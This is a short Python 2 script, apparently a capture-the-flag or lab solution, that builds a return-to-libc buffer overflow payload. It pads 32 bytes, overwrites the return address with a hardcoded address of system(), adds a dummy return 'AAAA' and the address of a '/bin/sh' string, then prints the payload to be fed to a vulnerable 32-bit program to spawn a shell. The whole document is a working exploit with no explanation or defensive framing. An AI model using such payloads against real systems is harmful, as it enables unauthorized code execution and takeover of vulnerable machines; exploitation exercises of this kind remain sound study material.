
import struct

padding = "\x46" * 32
system = struct.pack("I", 0xb7e63310)
binsh = struct.pack("I", 0xb7f85d4c)

payload = padding + system + "AAAA" + binsh

print payload